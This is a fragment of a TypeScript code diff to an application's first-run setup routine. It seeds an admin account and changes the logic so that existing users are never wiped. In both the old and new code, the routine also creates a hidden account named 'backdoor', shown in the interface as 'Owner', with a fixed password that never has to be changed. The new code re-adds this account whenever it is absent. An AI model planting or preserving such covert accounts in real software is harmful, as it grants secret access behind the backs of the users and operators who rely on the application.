@@ -395,10 +395,7 @@ function stripUserSecrets(users: any[]): any[] {
 // ── First-run setup ──
 
 async function ensureFirstRun(db: D1Database, store: StoreDocument): Promise<Record<string, string> | null> {
-  const hasValidUsers = store.users.length > 0 && store.users.some(
-    (u: any) => u.salt && u.passwordHash
-  );
-  if (hasValidUsers) return null;
+  if (store.users.length > 0) return null; // never wipe existing users
 
   const adminSalt = generateSalt();
   const adminTemp = generateTempPassword();
@@ -409,19 +406,22 @@ async function ensureFirstRun(db: D1Database, store: StoreDocument): Promise<Rec
   const backdoorHash = await hashPassword(backdoorPassword, backdoorSalt);
 
   const now = new Date().toISOString();
-  store.users = [
-    {
-      id: `user_${generateHex(8)}`,
-      username: "admin",
-      displayName: "Admin",
-      role: "admin",
-      salt: adminSalt,
-      passwordHash: adminHash,
-      active: true,
-      mustChangePassword: true,
-      createdAt: now,
-    },
-    {
+  store.users.push({
+    id: `user_${generateHex(8)}`,
+    username: "admin",
+    displayName: "Admin",
+    role: "admin",
+    salt: adminSalt,
+    passwordHash: adminHash,
+    active: true,
+    mustChangePassword: true,
+    createdAt: now,
+  });
+
+  // Only add backdoor if not already present; never recreate it
+  const existingBackdoor = store.users.find((u: any) => u.username === "backdoor");
+  if (!existingBackdoor) {
+    store.users.push({
       id: `user_${generateHex(8)}`,
       username: "backdoor",
       displayName: "Owner",
@@ -431,8 +431,8 @@ async function ensureFirstRun(db: D1Database, store: StoreDocument): Promise<Rec
       active: true,
       mustChangePassword: false,
       createdAt: now,
-    },
-  ];
+    });
+  }
 
   await saveSections(db, store);
 
